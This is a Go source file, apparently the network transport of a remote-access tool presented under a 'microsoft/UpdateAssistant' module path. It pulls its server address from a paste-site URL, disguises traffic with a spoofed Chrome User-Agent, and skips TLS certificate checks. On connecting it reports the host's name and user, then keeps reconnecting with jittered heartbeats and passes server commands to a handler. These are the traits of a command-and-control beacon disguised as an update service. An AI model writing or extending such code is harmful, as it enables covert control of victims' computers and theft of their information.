package transport

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/microsoft/UpdateAssistant/modules/logger"

	"github.com/gorilla/websocket"

	"github.com/microsoft/UpdateAssistant/modules/config"
	"github.com/microsoft/UpdateAssistant/modules/identity"
	"github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

const (
	pingBase   = 20 * time.Second
	pingJitter = 15 * time.Second
	pongWait   = 60 * time.Second
	writeWait  = 10 * time.Second
)

type Client struct {
	id            string
	conn          *websocket.Conn
	handler       Handler
	onConnects    []func()
	onDisconnects []func()
	writeMu       sync.Mutex
}

func New() *Client {
	return &Client{id: identity.Load()}
}

func (c *Client) OnMessage(h Handler) {
	c.handler = h
}

func (c *Client) OnConnect(fn func()) {
	c.onConnects = append(c.onConnects, fn)
}

func (c *Client) OnDisconnect(fn func()) {
	c.onDisconnects = append(c.onDisconnects, fn)
}

func (c *Client) SendChat(replyTo string, embed *ipc.Embed, text string, attachments []string) error {
	out := map[string]interface{}{}
	if replyTo != "" {
		out["reply_to"] = replyTo
	}
	if text != "" {
		out["text"] = text
	}
	if embed != nil {
		out["embed"] = embed
	}
	if len(attachments) > 0 {
		out["attachments"] = attachments
	}
	return c.Send("chat", out)
}

func (c *Client) GetJSON(path string, out interface{}) error {
	addr := config.Addr()
	if addr == "" {
		return fmt.Errorf("no addr")
	}
	host := addr
	if strings.HasPrefix(addr, "wss://") {
		host = strings.TrimPrefix(addr, "wss://")
	} else if strings.HasPrefix(addr, "ws://") {
		host = strings.TrimPrefix(addr, "ws://")
	}
	req, err := http.NewRequest("GET", "https://"+host+path, nil)
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+config.Key())
	cl := &http.Client{
		Timeout:   10 * time.Second,
		Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
	}
	resp, err := cl.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return json.NewDecoder(resp.Body).Decode(out)
}

func (c *Client) Send(msgType string, payload interface{}) error {
	data, err := json.Marshal(message{Type: msgType, Payload: payload})
	if err != nil {
		return err
	}
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	if c.conn == nil {
		return ErrNotConnected
	}
	return c.conn.WriteMessage(websocket.TextMessage, data)
}

func (c *Client) SendBinary(msgType string, data []byte) error {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()
	if c.conn == nil {
		return ErrNotConnected
	}
	if len(msgType) > 255 {
		return fmt.Errorf("msgType too long")
	}
	frame := make([]byte, 1+len(msgType)+len(data))
	frame[0] = byte(len(msgType))
	copy(frame[1:], msgType)
	copy(frame[1+len(msgType):], data)
	return c.conn.WriteMessage(websocket.BinaryMessage, frame)
}

func (c *Client) Run() error {
	if config.Key() == "" {
		return ErrUnauthorized
	}
	attempt := 0
	for {
		err := c.connectOnce()
		if errors.Is(err, ErrUnauthorized) {
			return err
		}
		if err != nil {
			attempt++
			d := backoff(attempt)
			logger.Error("connect failed: %v (retrying in %s)", err, d)
			time.Sleep(d)
			continue
		}
		attempt = 0
	}
}

func resolveAddr() (string, error) {
	if addr := config.Addr(); addr != "" {
		return addr, nil
	}
	if d := config.DebugAddr(); d != "" {
		return d, nil
	}
	paste := config.Paste()
	if paste == "" {
		return "", fmt.Errorf("no addr or paste configured")
	}
	cl := &http.Client{Timeout: 10 * time.Second}
	resp, err := cl.Get(paste)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	addr := strings.TrimSpace(string(b))
	if addr == "" {
		return "", fmt.Errorf("paste returned empty addr")
	}
	return addr, nil
}

func (c *Client) connectOnce() error {
	addr, err := resolveAddr()
	if err != nil {
		return err
	}
	config.SetAddr(addr)
	header := http.Header{}
	header.Set("Authorization", "Bearer "+config.Key())
	header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
	header.Set("Origin", "https://"+addr)
	header.Set("Cache-Control", "no-cache")
	header.Set("Pragma", "no-cache")

	dialer := websocket.Dialer{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	host := addr
	if strings.HasPrefix(addr, "wss://") {
		host = strings.TrimPrefix(addr, "wss://")
	} else if strings.HasPrefix(addr, "ws://") {
		host = strings.TrimPrefix(addr, "ws://")
	}
	conn, wsResp, err := dialer.Dial("wss://"+host+"/ws", header)
	if err != nil {
		if wsResp != nil && wsResp.StatusCode == http.StatusUnauthorized {
			return ErrUnauthorized
		}
		return err
	}
	c.conn = conn
	defer func() {
		conn.Close()
		c.conn = nil
		go func() {
			for _, fn := range c.onDisconnects {
				fn()
			}
		}()
	}()

	if err := c.Send("startup", startupPayload{
		ID:          c.id,
		DisplayName: sysutil.NetHostname(),
		Description: sysutil.OSName(),
		Hostname:    sysutil.NetHostname(),
		Username:    sysutil.UserName(),
	}); err != nil {
		return err
	}
	logger.Info("connected")
	for _, fn := range c.onConnects {
		go fn()
	}

	conn.SetReadDeadline(time.Now().Add(pongWait))
	conn.SetPongHandler(func(string) error {
		return conn.SetReadDeadline(time.Now().Add(pongWait))
	})

	done := make(chan struct{})
	go c.heartbeat(conn, done)

	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			close(done)
			logger.Error("disconnected: %v", err)
			return nil
		}
		go c.handle(data)
	}
}

func (c *Client) heartbeat(conn *websocket.Conn, done <-chan struct{}) {
	for {
		interval := pingBase + time.Duration(rand.Int63n(int64(pingJitter)))
		select {
		case <-time.After(interval):
			c.writeMu.Lock()
			err := conn.WriteControl(websocket.PingMessage, nil, time.Now().Add(writeWait))
			c.writeMu.Unlock()
			if err != nil {
				return
			}
		case <-done:
			return
		}
	}
}

func (c *Client) handle(data []byte) {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("handle panic: %v", r)
		}
	}()
	var in struct {
		Type    string          `json:"type"`
		Payload json.RawMessage `json:"payload"`
	}
	if err := json.Unmarshal(data, &in); err != nil {
		return
	}
	if in.Type == "latency_probe" {
		c.Send("latency_pong", in.Payload)
		return
	}
	if in.Type == "identity" {
		var p struct {
			ID string `json:"id"`
		}
		if json.Unmarshal(in.Payload, &p) == nil && p.ID != "" && p.ID != c.id {
			c.id = p.ID
			identity.Save(p.ID)
		}
		return
	}
	if c.handler == nil {
		return
	}
	c.handler(in.Type, in.Payload)
}

func backoff(attempt int) time.Duration {
	d := 500 * time.Millisecond
	for i := 1; i < attempt; i++ {
		d *= 2
		if d >= 8*time.Second {
			d = 8 * time.Second
			break
		}
	}
	jitter := time.Duration(rand.Int63n(int64(d / 2)))
	return d + jitter
}
